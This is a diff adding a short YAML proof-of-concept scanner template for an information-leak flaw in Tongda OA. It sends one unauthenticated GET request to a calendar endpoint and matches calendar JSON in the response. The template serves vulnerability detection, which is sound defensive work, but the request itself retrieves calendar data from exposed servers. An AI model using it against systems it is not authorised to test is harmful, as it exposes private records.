@@ -1,0 +1,14 @@
+name: poc-yaml-tongdaoa_information_leak
+
+rules:
+
+  - method: GET
+    path: /general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=1597997506&view=agendaDay
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes('[{"view":"agendaDay","type":"affair"'))
+
+detail:
+  author: Cannae(github.com/thunderbarca)
+  links:
+    - http://cn-sec.com/archives/98487.html
